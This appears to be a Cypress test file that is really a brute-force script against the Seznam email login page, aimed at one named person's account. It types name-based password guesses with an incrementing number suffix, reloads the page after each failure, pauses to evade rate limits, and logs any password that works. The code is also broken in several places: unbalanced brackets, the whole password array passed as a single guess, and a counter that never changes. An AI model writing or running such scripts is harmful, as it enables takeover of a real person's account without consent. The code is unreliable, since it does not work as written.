let pswd = [
  "dominiksibl1",
  "Dominiksibl1",
  "DominikSibl1",
  "domsec",
]
let attempts = 0
let passwdIndex = 0
let number = 1
describe('test',()=>{
  it('should',()=>{
    cy.visit('https://login.szn.cz/')

    recursiveStep()
  }

})
function recursiveStep(){
  if(attempts == 20)
    cy.wait(600)
  clearForm();
  if(passwdIndex > 3){
    passwdIndex = 0;
    number++;
  }else
    passwdIndex++

  fillFormAndSubmit(pswd)

  cy.get('body').find('.error').then((el=>{

      if(el.length > 0){
        cy.visit('https://login.szn.cz/')
        recursiveStep()
      }
      else
        console.log(pswd+number)
    })

  }))
}

function fillFormAndSubmit(pswd){

  cy.get('#login-username').type('dominiksibl1');
  cy.get('.login > select').select('@email.cz')
  cy.get('#login-password',{}).type(pswd+number)
  cy.get('[data-locale="login.submit"]').click()
}
function clearForm(){

  cy.get('#login-username').clear();
  cy.get('#login-password').clear()

}
